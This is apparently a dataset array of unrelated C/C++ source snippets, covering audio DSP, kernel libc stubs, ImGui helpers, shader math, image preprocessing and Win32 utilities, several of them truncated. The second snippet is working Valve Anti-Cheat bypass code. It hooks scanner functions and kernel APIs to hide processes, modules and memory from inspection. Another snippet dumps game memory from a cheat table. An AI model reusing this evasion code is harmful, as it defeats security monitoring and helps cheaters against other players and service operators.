[
    "#include \"daisysp.h\"\n#include \"daisy_seed.h\"\n\n// Interleaved audio definitions\n#define LEFT (i)\n#define RIGHT (i + 1)\n\nusing namespace daisysp;\nusing namespace daisy;\n\nstatic DaisySeed hw;\n\n// Number of delay lines\n#define DEL_NUM 4U\n\n// Declare FDN DelayLines\nstatic DelayLine<float, 4999U + 1U> FDN_del[DEL_NUM];\n\n// Declare LPF DelayLines\nstatic DelayLine<float, 1U> lpf_del[DEL_NUM];\n\n// Declare APF DelayLines\nstatic DelayLine<float, 557U + 1U> apf_del[DEL_NUM];\n\n// FDN feedback matrix - 4x4\nconst signed char hadamard_matrix[DEL_NUM][DEL_NUM] = {\n{  1,  1,  1,  1  },\n{ -1,  1, -1,  1  },\n{ -1, -1,  1,  1  },\n{  1, -1, -1,  1  }\n};\n\n// Matrix scalar for Hadamard\n#define MATRIX_SCALAR 0.5f\n\n// Number of primes\n#define PRIMES_NUM 669\n\nconst unsigned short primes[PRIMES_NUM] = {\n2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,103,107,109,113,127,131,137,139,149,151,157,163,167,173,179,181,191,193,197,199,211,223,227,229,233,239,241,251,257,263,269,271,277,281,283,293,307,311,313,317,331,337,347,349,353,359,367,373,379,383,389,397,401,409,419,421,431,433,439,443,449,457,461,463,467,479,487,491,499,503,509,521,523,541,547,557,563,569,571,577,587,593,599,601,607,613,617,619,631,641,643,647,653,659,661,673,677,683,691,701,709,719,727,733,739,743,751,757,761,769,773,787,797,809,811,821,823,827,829,839,853,857,859,863,877,881,883,887,907,911,919,929,937,941,947,953,967,971,977,983,991,\n997,1009,1013,1019,1021,1031,1033,1039,1049,1051,1061,1063,1069,1087,1091,1093,1097,1103,1109,1117,1123,1129,1151,1153,1163,1171,1181,1187,1193,1201,1213,1217,1223,1229,1231,1237,1249,1259,1277,1279,1283,1289,1291,1297,1301,1303,1307,1319,1321,1327,1361,1367,1373,1381,1399,1409,1423,1427,1429,1433,1439,1447,1451,1453,1459,1471,1481,1483,1487,1489,1493,1499,1511,1523,1531,1543,1549,1553,1559,1567,1571,1579,1583,1597,1601,1607,1609,1613,1619,1621,1627,1637,1657,1663,1667,1669,1693,1697,1699,1709,1721,1723,1733,1741,1747,1753,1759,1777,1783,1787,1789,1801,1811,1823,1831,1847,1861,1867,1871,1873,1877,1879,1889,1901,1907,1913,1931,1933,\n1949,1951,1973,1979,1987,1993,1997,1999,2003,2011,2017,2027,2029,2039,2053,2063,2069,2081,2083,2087,2089,2099,2111,2113,2129,2131,2137,2141,2143,2153,2161,2179,2203,2207,2213,2221,2237,2239,2243,2251,2267,2269,2273,2281,2287,2293,2297,2309,2311,2333,2339,2341,2347,2351,2357,2371,2377,2381,2383,2389,2393,2399,2411,2417,2423,2437,2441,2447,2459,2467,2473,2477,2503,2521,2531,2539,2543,2549,2551,2557,2579,2591,2593,2609,2617,2621,2633,2647,2657,2659,2663,2671,2677,2683,2687,2689,2693,2699,2707,2711,2713,2719,2729,2731,2741,2749,2753,2767,2777,2789,2791,2797,2801,2803,2819,2833,2837,2843,2851,2857,2861,2879,2887,2897,2903,2909,2917,2927,\n2939,2953,2957,2963,2969,2971,2999,3001,3011,3019,3023,3037,3041,3049,3061,3067,3079,3083,3089,3109,3119,3121,3137,3163,3167,3169,3181,3187,3191,3203,3209,3217,3221,3229,3251,3253,3257,3259,3271,3299,3301,3307,3313,3319,3323,3329,3331,3343,3347,3359,3361,3371,3373,3389,3391,3407,3413,3433,3449,3457,3461,3463,3467,3469,3491,3499,3511,3517,3527,3529,3533,3539,3541,3547,3557,3559,3571,3581,3583,3593,3607,3613,3617,3623,3631,3637,3643,3659,3671,3673,3677,3691,3697,3701,3709,3719,3727,3733,3739,3761,3767,3769,3779,3793,3797,3803,3821,3823,3833,3847,3851,3853,3863,3877,3881,3889,3907,3911,3917,3919,3923,3929,3931,3943,3947,3967,3989,4001,\n4003,4007,4013,4019,4021,4027,4049,4051,4057,4073,4079,4091,4093,4099,4111,4127,4129,4133,4139,4153,4157,4159,4177,4201,4211,4217,4219,4229,4231,4241,4243,4253,4259,4261,4271,4273,4283,4289,4297,4327,4337,4339,4349,4357,4363,4373,4391,4397,4409,4421,4423,4441,4447,4451,4457,4463,4481,4483,4493,4507,4513,4517,4519,4523,4547,4549,4561,4567,4583,4591,4597,4603,4621,4637,4639,4643,4649,4651,4657,4663,4673,4679,4691,4703,4721,4723,4729,4733,4751,4759,4783,4787,4789,4793,4799,4801,4813,4817,4831,4861,4871,4877,4889,4903,4909,4919,4931,4933,4937,4943,4951,4957,4967,4969,4973,4987,4993,4999\n};\n\nunsigned int selectedPrimes[DEL_NUM];\n\n// G gains\nfloat g[DEL_NUM] = {0.805f, 0.827f, 0.783f, 0.764f};\n\nfloat u, sig_out;\nfloat lpf_y[DEL_NUM];\nfloat apf_del_out, apf_feedback, apf_y; //[DEL_NUM];\nfloat FDN_del_out[DEL_NUM]; // delay outs\nfloat FDN_feedback;\nunsigned char idx, r, c; // for-loop variables\n\nfloat wetCV;\nfloat lengthCV;\nfloat densityCV;\n\n\nstatic void AudioCallback(AudioHandle::InterleavingInputBuffer  in,\n                          AudioHandle::InterleavingOutputBuffer out,\n                          size_t                                size)\n{\n\n    for(size_t i = 0; i < size; i += 2)\n    {\n\n        u = 0.5f * (in[LEFT] + in[RIGHT]); // mono input\n\n        // Process delay outs and output signal\n        sig_out = 0.0f;\n        for(idx = 0; idx < DEL_NUM; idx++){\n            FDN_del_out[idx] = FDN_del[idx].Read();\n            sig_out += FDN_del_out[idx] / 4.0f;\n\n\t\t\t// LPF\n            lpf_y[idx] = (0.8f * FDN_del_out[idx]) + (0.2f * lpf_del[idx].Read());\n            lpf_del[idx].Write(lpf_y[idx]);\n\n\t\t\t// APF\n\t\t\t//apf_del_out = apf",
    "#include \"Hooks.h\"\r\n\r\nint _cdecl hkTfn1(HANDLE ProcessHandle, int a2){\r\n\tif (ProcessHandle == GetCurrentProcess())\r\n\t\treturn pFn1(ProcessHandle, a2);\r\n\treturn false;\r\n}\r\n\r\nDWORD _stdcall hkTfn2(HANDLE TargetHandle, int a2, int a3){\r\n\tif (TargetHandle == GetCurrentProcess())\r\n\t\treturn pFn2(TargetHandle, a2, a3);\r\n\treturn false;\r\n}\r\n\r\nbool _cdecl hkTfn3(DWORD dwProcessId, int a2, int a3){\r\n\tif (dwProcessId == GetCurrentProcessId())\r\n\t\treturn pFn3(dwProcessId, a2, a3);\r\n\treturn false;\r\n}\r\n\r\nchar _stdcall hkTfn4(){\r\n\treturn true;\r\n}\r\n\r\nchar _stdcall hkTfn5(char* p_this){\r\n\treturn true;\r\n}\r\n\r\nDWORD* _stdcall hkTfn6(DWORD* p_this){\r\n\treturn p_this;\r\n}\r\n\r\nchar _stdcall hkTfn7(BYTE* p_this, int a2, HANDLE TargetHandle, int a4, int a5, int a6){\r\n\tif (TargetHandle == GetCurrentProcess())\r\n\t\treturn pFn7(p_this, a2, TargetHandle, a4, a5, a6);\r\n\treturn true;\r\n}\r\n\r\nSIZE_T __stdcall hkVirtualQuery(LPCVOID lpAdress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) {\r\n\tlpBuffer->AllocationProtect = PAGE_NOACCESS;\r\n\tlpBuffer->Protect = PAGE_NOACCESS;\r\n\tlpBuffer->Type = MEM_MAPPED;\r\n\treturn sizeof(MEMORY_BASIC_INFORMATION);\r\n}\r\n\r\nSIZE_T __stdcall hkVirtualQueryEx(HANDLE hProcess, LPCVOID lpAdress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) {\r\n\tlpBuffer->AllocationProtect = PAGE_NOACCESS;\r\n\tlpBuffer->Protect = PAGE_NOACCESS;\r\n\tlpBuffer->Type = MEM_MAPPED;\r\n\treturn sizeof(MEMORY_BASIC_INFORMATION);\r\n}\r\n\r\nBOOL __stdcall hkProcess32NextW(HANDLE hSnapShot, LPPROCESSENTRY32W lppe) {\r\n\treturn 0;\r\n}\r\n\r\nBOOL __stdcall hkModule32NextW(HANDLE hSnapShot, LPMODULEENTRY32W lppe) {\r\n\treturn 0;\r\n}\r\n\r\nBOOL __stdcall hkIsDebuggerPresent(){\r\n\treturn false;\r\n}\r\n\r\nNTSTATUS hkNtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG BufferSize, PULONG NumberOfBytesRead){\r\n\treturn STATUS_ACCESS_VIOLATION;\r\n}\r\n\r\nbool InitVACHooks(void* DllImageBase) {\r\n\tpFn1 = (tFn1)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 83 EC ? 8D 45 F8 C7 45 F8 ? ? ? ?\"), (PBYTE)hkTfn1);\r\n\tpFn2 = (tFn2)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 81 EC ? ? ? ? 53 56 57 6A ? 68 ? ? ? ?\"), (PBYTE)hkTfn2);\r\n\tpFn3 = (tFn3)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 51 56 57 8B 7D 0C\"), (PBYTE)hkTfn3);\r\n\tpFn4 = (tFn4)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 81 EC ? ? ? ? 56 8B 35 ? ? ? ?\"), (PBYTE)hkTfn4);\r\n\tpFn5 = (tFn5)DetourFunction((PBYTE)PatternScan(DllImageBase, \"56 57 8B F9 C7 07 ? ? ? ? C7 47 04 ? ? ? ?\"), (PBYTE)hkTfn5);\r\n\tpFn6 = (tFn6)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 83 EC ? 56 8B F1 C7 06 ? ? ? ?\"), (PBYTE)hkTfn6);\r\n\tpFn7 = (tFn7)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 81 EC ? ? ? ? 53 8B D9 32 C0\"), (PBYTE)hkTfn7);\r\n\r\n\tHMODULE kernelModule = GetModuleHandleA(\"kernel32.dll\");\r\n\tif (!kernelModule)\r\n\t\treturn false;\r\n\r\n\tpVirtualQuery = (tVirtualQuery)DetourFunction((PBYTE)GetProcAddress(kernelModule, \"VirtualQuery\"), (PBYTE)hkVirtualQuery);\r\n\tpVirtualQueryEx = (tVirtualQueryEx)DetourFunction((PBYTE)GetProcAddress(kernelModule, \"VirtualQueryEx\"), (PBYTE)hkVirtualQueryEx);\r\n\tpProcess32NextW = (tProcess32NextW)DetourFunction((PBYTE)GetProcAddress(kernelModule, \"Process32NextW\"), (PBYTE)hkProcess32NextW);\r\n\tpModule32NextW = (tModule32NextW)DetourFunction((PBYTE)GetProcAddress(kernelModule, \"Module32NextW\"), (PBYTE)hkModule32NextW);\r\n\tpIsDebuggerPresent = (tIsDebuggerPresent)DetourFunction((PBYTE)GetProcAddress(kernelModule, \"IsDebuggerPresent\"), (PBYTE)hkIsDebuggerPresent);\r\n\tpNtReadVirtualMemory = (tNtReadVirtualMemory)DetourFunction((PBYTE)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtReadVirtualMemory\"), (PBYTE)hkNtReadVirtualMemory);\r\n\r\n\r\n\treturn true;\r\n}\r\n",
    "#include <lib/print.h>\n#include <stddef.h>\n#include <stdint.h>\n\n// GCC and clang reserve the right to generate calls to these functions\n// even if they are not explicitly used in the code.\n\nextern \"C\" void* memcpy(void* dest, const void* src, size_t count) {\n  char* dest8 = (char*)dest;\n  const char* src8 = (const char*)src;\n\n  while (count--) {\n    *dest8++ = *src8++;\n  }\n\n  return dest;\n}\n\nextern \"C\" void* memset(void* dest, int value, size_t count) {\n  unsigned char* dest8 = (unsigned char*)dest;\n  unsigned char val8 = (unsigned char)value;\n\n  while (count--) {\n    *dest8++ = val8;\n  }\n\n  return dest;\n}\n\nextern \"C\" void* memmove(void* dest, const void* src, size_t count) {\n  char* dest8 = (char*)dest;\n  const char* src8 = (const char*)src;\n\n  if (src8 > dest8) {\n    while (count--) {\n      *dest8++ = *src8++;\n    }\n  } else {\n    dest8 += count;\n    src8 += count;\n\n    while (count--) {\n      *--dest8 = *--src8;\n    }\n  }\n\n  return dest;\n}\n\nextern \"C\" int memcmp(const void* ptr1, const void* ptr2, size_t count) {\n  const unsigned char* p1 = (const unsigned char*)ptr1;\n  const unsigned char* p2 = (const unsigned char*)ptr2;\n\n  while (count--) {\n    if (*p1 != *p2)\n      return *p1 < *p2 ? -1 : 1;\n\n    p1++;\n    p2++;\n  }\n\n  return 0;\n}\n\n// These following two stubs are required by the Itanium C++ ABI\n\nextern \"C\" int __cxa_atexit(void (*)(void*), void*, void*) {\n  // @note: This really shouldn't be called given that we compile\n  // with -fno-use-cxa-atexit\n  kpanic(\"Attempt to call __cxa_atexit\\n\");\n}\n\nextern \"C\" void __cxa_pure_virtual() {\n  kpanic(\"Pure virtual function called\\n\");\n}\n",
    "#include <deque>\n#include <filesystem>\n#include <fstream>\n#include <ranges>\n\n#include \"common.hpp\"\n\n// TODO: whether to support write access (file-editing)?\n// Or at least support saving rules into file (without relying on the clipboard)?\n\nusing pathT = std::filesystem::path;\n\n// (wontfix) After wasting so much time, I'd rather afford the extra copy than bothering with \"more efficient\"\n// implementations any more.\n\nstatic std::string cpp17_u8string(const pathT& path) {\n    const auto u8string = path.u8string();\n    return std::string(u8string.begin(), u8string.end());\n}\n\n// As to why not using `filesystem::u8path`:\n// There is no standard way to shut the compiler up for a [[deprecated]] warning.\n// As to making an `std::u8string` first, see:\n// https://stackoverflow.com/questions/57603013/how-to-safely-convert-const-char-to-const-char8-t-in-c20\n// In short, in C++20 it's impossible to get `char8_t*` from `char*` without copy and in a well-defined way.\nstatic pathT cpp17_u8path(const std::string_view path) { //\n    return pathT(std::u8string(path.begin(), path.end()));\n}\n\n// I hate this part so much...\n// (This is horribly inefficient, but there are not going to be too many calls in each frame, so let it go.)\n[[nodiscard]] static std::string clip_path(const pathT& p, const float avail_w, bool* clipped = nullptr) {\n    auto set_clipped = [&clipped](bool b) {\n        if (clipped) {\n            *clipped = b;\n        }\n    };\n    if (p.empty()) {\n        set_clipped(false);\n        return \"\";\n    }\n\n    std::string full_str = cpp17_u8string(p);\n    const float full_w = ImGui::CalcTextSize(full_str.c_str()).x;\n    if (full_w <= avail_w) {\n        set_clipped(false);\n        return full_str;\n    } else {\n        set_clipped(true);\n        if (!p.has_relative_path()) {\n            return full_str;\n        }\n\n        // Try to make a shorter string in the form of:\n        // .../longest suffix in the relative_path within `avail_w`, always including the last element.\n        std::vector<pathT> segs;\n        for (pathT seg : p.relative_path()) {\n            segs.push_back(std::move(seg));\n        }\n        assert(!segs.empty());\n\n        // ~ `&sep + 1` is valid, see:\n        // https://stackoverflow.com/questions/14505851/is-the-one-past-the-end-pointer-of-a-non-array-type-a-valid-concept-in-c\n        const char sep = pathT::preferred_separator;\n        const float sep_w = ImGui::CalcTextSize(&sep, &sep + 1).x;\n\n        std::vector<std::string> vec;\n        vec.push_back(cpp17_u8string(segs.back()));\n        float suffix_w = ImGui::CalcTextSize(vec.back().c_str()).x + ImGui::CalcTextSize(\"...\").x + sep_w;\n        for (auto pos = segs.rbegin() + 1; pos != segs.rend(); ++pos) {\n            std::string seg_str = cpp17_u8string(*pos);\n            const float seg_w = ImGui::CalcTextSize(seg_str.c_str()).x;\n            if (suffix_w + (seg_w + sep_w) <= avail_w) {\n                suffix_w += (seg_w + sep_w);\n                vec.push_back(std::move(seg_str));\n            } else {\n                break;\n            }\n        }\n\n        if (suffix_w > full_w) {\n            // This may happen in rare cases like `C:/very-long-name`.\n            return full_str;\n        } else {\n            std::string str = \"...\";\n            for (auto pos = vec.rbegin(); pos != vec.rend(); ++pos) {\n                str += sep;\n                str += *pos;\n            }\n            return str;\n        }\n    }\n}\n\n// (Sharing the same style as `imgui_StrCopyable`.)\nstatic void display_path(const pathT& p, float avail_w) {\n    bool clipped = false;\n    imgui_Str(clip_path(p, avail_w, &clipped));\n    if (clipped) {\n        imgui_ItemTooltip([&] { imgui_Str(cpp17_u8string(p)); });\n    }\n    if (imgui_ItemClickable()) {\n        ImGui::SetClipboardText(cpp17_u8string(p).c_str());\n    }\n}\n\nstatic void display_filename(const pathT& p) {\n    imgui_Str(std::string(\"...\") + char(pathT::preferred_separator) + cpp17_u8string(p.filename()));\n    imgui_ItemTooltip([&] { imgui_Str(cpp17_u8string(p)); });\n    if (imgui_ItemClickable()) {\n        ImGui::SetClipboardText(cpp17_u8string(p).c_str());\n    }\n}\n\nstatic pathT home_path{};\nbool set_home(const char* u8path) {\n    auto try_set = [](const char* u8path) {\n        std::error_code ec{};\n        const pathT p = u8path ? cpp17_u8path(u8path) : std::filesystem::current_path(ec);\n        if (!ec) {\n            pathT cp = std::filesystem::canonical(p, ec);\n            if (!ec) {\n                home_path.swap(cp);\n\n                // These will outlive the imgui context.\n                static std::string ini_path, log_path;\n                ini_path = cpp17_u8string(home_path / \"imgui.ini\");\n                log_path = cpp17_u8string(home_path / \"imgui_log.txt\");\n                ImGui::GetIO().IniFilename = ini_path.c_str();\n                ImGui::GetIO().LogFilename = log_path.c_str();\n                return true;\n            }\n        }\n        return false;\n    };\n\n    return (u8path && try_set(u8path)) || try_set(",
    "#include \"um.h\"\r\n#include \"json.h\"\r\n#include <fstream>\r\n\r\nusing nlohmann::json;\r\n\r\nint main( ) {\r\n    // Setup\r\n    cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_meth_setup();\r\n\r\n    // Get module\r\n    auto game_assembly = cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_get_module(L\"GameAssembly.dll\");\r\n\r\n    // Read JSON input\r\n    std::ifstream input(\"json.txt\");\r\n    nlohmann::json crazy_swag;\r\n    input >> crazy_swag;\r\n    input.close();\r\n\r\n    // Open output file\r\n    std::ofstream output(\"material_output.txt\");\r\n\r\n    // Process each entry in the JSON\r\n    auto crazy_sneed = crazy_swag[\"CheatTable\"][\"CheatEntries\"][\"CheatEntry\"];\r\n    for (auto& entry : crazy_sneed) {\r\n        // Extract address\r\n        std::string addr_s = entry[\"Address\"];\r\n        unsigned long long crazy_value;\r\n        std::istringstream iss(addr_s);\r\n        iss >> std::hex >> crazy_value;\r\n        crazy_value -= 0x88;\r\n\r\n        // Read name\r\n        char material_name[255];\r\n        auto material_addy = cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_read<uintptr_t>(crazy_value + 0x30);\r\n        cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_read(material_addy, material_name, 255);\r\n        material_name[254] = 0;\r\n        std::string name(material_name);\r\n\r\n        // Read key\r\n        auto material_address = cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_read<uint32_t>(crazy_value + 0x8);\r\n\r\n        // Write to output file\r\n        output << \"material name: \" << name << \", material address: \" << material_address << \"\\n\";\r\n    }\r\n\r\n    // Close output file\r\n    output.close();\r\n\r\n    return 0;\r\n}",
    "#include \"detours.h\"\n#include <map>\n#include <vector>\n\nSymbolFinder symfinder;\nvoid* GetFunction(void* module, Symbol symbol)\n{\n\treturn symfinder.Resolve(module, symbol.name.c_str(), symbol.length);\n}\n\nstd::map<DETOUR_CATEGOY, std::vector<Detouring::Hook*>> detours = {};\nvoid CreateDetour(Detouring::Hook* hook, const char* name, void* module, Symbol symbol, void* hook_func, DETOUR_CATEGOY category)\n{\n\tvoid* func = symfinder.Resolve(module, symbol.name.c_str(), symbol.length);\n\tif (!CheckFunction(func, name))\n\t\treturn;\n\n\thook->Create(func, hook_func);\n\thook->Enable();\n\n\tdetours[category].push_back(hook);\n\n\tif (!hook->IsValid()) {\n\t\tMsg(\"Failed to detour %s!\\n\", name);\n\t}\n}\n\nvoid RemoveDetours(DETOUR_CATEGOY category)\n{\n\tif (category == DETOUR_ALL)\n\t{\n\t\tfor (auto& [_, cat_detours] : detours) {\n\t\t\tfor (Detouring::Hook* hook : cat_detours) {\n\t\t\t\tif (hook->IsEnabled())\n\t\t\t\t{\n\t\t\t\t\thook->Disable();\n\t\t\t\t\thook->Destroy();\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tdetours.clear();\n\t} else {\n\t\tfor (Detouring::Hook* hook : detours[category]) {\n\t\t\tif (hook->IsEnabled())\n\t\t\t{\n\t\t\t\thook->Disable();\n\t\t\t\thook->Destroy();\n\t\t\t}\n\t\t}\n\t\tdetours[category].clear();\n\t}\n}",
    "// Copyright 2024 by Owen Bulka.\n// All rights reserved.\n// This file is released under the \"MIT License Agreement\".\n// Please see the LICENSE.md file that should have been included as part\n// of this package.\n\n\n//\n// Math operations\n//\n\n\n/**\n * Compute the fractional portion of the value. Ex. 3.5 returns 0.5\n *\n * @arg value: The value to get the fractional portion of.\n *\n * @returns: The fractional portion of the value.\n */\ninline float fract(const float value)\n{\n    return value - floor(value);\n}\n\n\n/**\n * Multiply a 4d vector by a 4x4 matrix.\n *\n * @arg m: The matrix that will transform the vector.\n * @arg v: The vector to transform.\n * @arg out: The location to store the resulting vector.\n */\ninline void matmul(const float4x4 &m, const float4 &v, float4 &out)\n{\n    for (int i=0; i < 4; i++)\n    {\n        out[i] = 0;\n\n        for (int j=0; j < 4; j++)\n        {\n            out[i] += m[i][j] * v[j];\n        }\n    }\n}\n\n\n/**\n * Multiply a 4d vector by a 4x4 matrix.\n *\n * @arg m: The matrix that will transform the vector.\n * @arg v: The vector to transform.\n * @arg out: The location to store the resulting vector.\n */\ninline float4 matmul(const float4x4 &m, const float4 &v)\n{\n    float4 out;\n    for (int i=0; i < 4; i++)\n    {\n        out[i] = 0;\n\n        for (int j=0; j < 4; j++)\n        {\n            out[i] += m[i][j] * v[j];\n        }\n    }\n\n    return out;\n}\n\n\n/**\n * Multiply a 3d vector by a 3x3 matrix.\n *\n * @arg m: The matrix that will transform the vector.\n * @arg v: The vector to transform.\n * @arg out: The location to store the resulting vector.\n */\ninline float3 matmul(const float3x3 &m, const float3 &v)\n{\n    return float3(\n        m[0][0] * v.x + m[0][1] * v.y + m[0][2] * v.z,\n        m[1][0] * v.x + m[1][1] * v.y + m[1][2] * v.z,\n        m[2][0] * v.x + m[2][1] * v.y + m[2][2] * v.z\n    );\n}\n\n\n/**\n * Convert the uv position in a latlong image to angles.\n *\n * @arg uvPosition: The UV position.\n *\n * @returns: The equivalent angles in radians.\n */\ninline float2 uvPositionToAngles(const float2 &uvPosition)\n{\n    return float2(\n        (uvPosition.x + 1.0f) * PI,\n        (1.0f - uvPosition.y) * PI / 2.0f\n    );\n}\n\n\n/**\n * Convert location of a pixel in an image into UV.\n *\n * @arg pixelLocation: The x, and y positions of the pixel.\n * @arg format: The image width, and height.\n *\n * @returns: The UV position.\n */\ninline float2 pixelsToUV(const float2 &pixelLocation, const float2 &format)\n{\n    return float2(\n        2.0f * pixelLocation.x / format.x - 1.0f,\n        2.0f * pixelLocation.y / format.y - 1.0f\n    );\n}\n\n\n/**\n * Convert a spherical unit vector (unit radius) to cartesion.\n *\n * @arg angles: The spherical angles in radians.\n *\n * @returns: The equivalent cartesion vector.\n */\ninline float3 sphericalUnitVectorToCartesion(const float2 &angles)\n{\n    const float sinPhi = sin(angles.y);\n    return float3(\n        cos(angles.x) * sinPhi,\n        cos(angles.y),\n        sin(angles.x) * sinPhi\n    );\n}\n\n\n/**\n * Get the position component of a world matrix.\n *\n * @arg worldMatrix: The world matrix.\n * @arg position: The location to store the position.\n */\ninline void positionFromWorldMatrix(const float4x4 &worldMatrix, float3 &position)\n{\n    position = float3(\n        worldMatrix[0][3],\n        worldMatrix[1][3],\n        worldMatrix[2][3]\n    );\n}\n\n\n/**\n * Get the rotation component of a world matrix.\n *\n * @arg worldMatrix: The world matrix.\n * @arg rotation: The location to store the rotation.\n */\ninline void rotationFromWorldMatrix(const float4x4 &worldMatrix, float3x3 &rotationMatrix)\n{\n    rotationMatrix[0][0] = worldMatrix[0][0];\n    rotationMatrix[0][1] = worldMatrix[0][1];\n    rotationMatrix[0][2] = worldMatrix[0][2];\n    rotationMatrix[1][0] = worldMatrix[1][0];\n    rotationMatrix[1][1] = worldMatrix[1][1];\n    rotationMatrix[1][2] = worldMatrix[1][2];\n    rotationMatrix[2][0] = worldMatrix[2][0];\n    rotationMatrix[2][1] = worldMatrix[2][1];\n    rotationMatrix[2][2] = worldMatrix[2][2];\n}\n\n\n//\n// Randomization functions\n//\n\n\n// Some random constants on the interval [1, 2]\n#define RAND_CONST_0 1.571411510193971f\n#define RAND_CONST_1 1.268632820084931f\n#define RAND_CONST_2 1.7880365647937733f\n#define RAND_CONST_3 1.3546987471558234f\n#define RAND_CONST_4 1.4365958250848703f\n#define RAND_CONST_5 1.7045380669435368f\n\n\n/**\n * Get a random value on the interval [0, 1].\n *\n * @arg seed: The random seed.\n *\n * @returns: A random value on the interval [0, 1].\n */\ninline float random(const float seed)\n{\n    return fract(sin(73.1f * seed + 91.3458f) * 47453.5453f);\n}\n\n\n/**\n * Get a random value on the interval [0, 1].\n *\n * @arg seed: The random seed.\n *\n * @returns: A random value on the interval [0, 1].\n */\ninline float2 random(const float2 &seed)\n{\n    return float2(\n        fract(sin(13.157f * seed.x + 71.743f) * 7513.471f),\n        fract(sin(97.519f * seed.y + 113.591f) * 47453.5453f)\n    );\n}\n\n\n/**\n * Create a random point that lies within the unit circle.\n *\n * @arg seed: The random seed.\n *\n *",
    "// Copyright (c) 2021 PaddlePaddle Authors. All Rights Reserved.\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n\n#include \"utils.h\"\n#include <arm_neon.h>\n#include <iostream>\n\nvoid NHWC3ToNC3HW(const float *din, float *dout, int size, const std::vector<float> mean,\n                  const std::vector<float> scale) {\n  if (mean.size() != 3 || scale.size() != 3) {\n    std::cerr << \"[ERROR] mean or scale size must equal to 3\\n\" << std ::endl;\n    return;\n  }\n  float32x4_t vmean0 = vdupq_n_f32(mean[0]);\n  float32x4_t vmean1 = vdupq_n_f32(mean[1]);\n  float32x4_t vmean2 = vdupq_n_f32(mean[2]);\n  float32x4_t vscale0 = vdupq_n_f32(scale[0]);\n  float32x4_t vscale1 = vdupq_n_f32(scale[1]);\n  float32x4_t vscale2 = vdupq_n_f32(scale[2]);\n\n  float *dout_c0 = dout;\n  float *dout_c1 = dout + size;\n  float *dout_c2 = dout + size * 2;\n\n  int i = 0;\n  for (; i < size - 3; i += 4) {\n    float32x4x3_t vin3 = vld3q_f32(din);\n    float32x4_t vsub0 = vsubq_f32(vin3.val[0], vmean0);\n    float32x4_t vsub1 = vsubq_f32(vin3.val[1], vmean1);\n    float32x4_t vsub2 = vsubq_f32(vin3.val[2], vmean2);\n    float32x4_t vs0 = vmulq_f32(vsub0, vscale0);\n    float32x4_t vs1 = vmulq_f32(vsub1, vscale1);\n    float32x4_t vs2 = vmulq_f32(vsub2, vscale2);\n    vst1q_f32(dout_c0, vs0);\n    vst1q_f32(dout_c1, vs1);\n    vst1q_f32(dout_c2, vs2);\n\n    din += 12;\n    dout_c0 += 4;\n    dout_c1 += 4;\n    dout_c2 += 4;\n  }\n  for (; i < size; i++) {\n    *(dout_c0++) = (*(din++) - mean[0]) * scale[0];\n    *(dout_c1++) = (*(din++) - mean[1]) * scale[1];\n    *(dout_c2++) = (*(din++) - mean[2]) * scale[2];\n  }\n}\n\nvoid NHWC1ToNC1HW(const float *src, float *dst, const float *mean, const float *std, int width, int height) {\n  int size = height * width;\n  float32x4_t vmean = vdupq_n_f32(mean ? mean[0] : 0.0f);\n  float32x4_t vscale = vdupq_n_f32(std ? (1.0f / std[0]) : 1.0f);\n  int i = 0;\n  for (; i < size - 3; i += 4) {\n    float32x4_t vin = vld1q_f32(src);\n    float32x4_t vsub = vsubq_f32(vin, vmean);\n    float32x4_t vs = vmulq_f32(vsub, vscale);\n    vst1q_f32(dst, vs);\n    src += 4;\n    dst += 4;\n  }\n  for (; i < size; i++) {\n    *(dst++) = (*(src++) - mean[0]) / std[0];\n  }\n}\n",
    "#include \"util.h\"\n\n#include <commdlg.h>\n#include <random>\n\nstd::optional<std::string> util::SelectFile(const char* filter, const char* title)\n{\n\tauto currPath = std::filesystem::current_path();\n\n\tOPENFILENAME ofn;\n\tchar szFile[260] = { 0 };\n\tZeroMemory(&ofn, sizeof(ofn));\n\tofn.lStructSize = sizeof(ofn);\n\tofn.hwndOwner = NULL;\n\tofn.lpstrFile = szFile;\n\tofn.nMaxFile = sizeof(szFile);\n\tofn.lpstrFilter = filter;\n\tofn.lpstrTitle = title;\n\tofn.nFilterIndex = 1;\n\tofn.lpstrFileTitle = NULL;\n\tofn.nMaxFileTitle = 0;\n\tofn.lpstrInitialDir = NULL;\n\tofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;\n\n\tstd::optional<std::string> result = {};\n\tif (GetOpenFileName(&ofn) == TRUE)\n\t\tresult = std::string(szFile);\n\n\tcurrent_path(currPath);\n\treturn result;\n}\n\nstd::string util::GetLastErrorAsString(DWORD errorId)\n{\n\tauto errorMessageID = errorId == 0 ? GetLastError() : errorId;\n\tif (errorMessageID == 0)\n\t\treturn std::string();\n\t\n\tLPSTR messageBuffer = nullptr;\n\tauto size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,\n\t\tNULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, 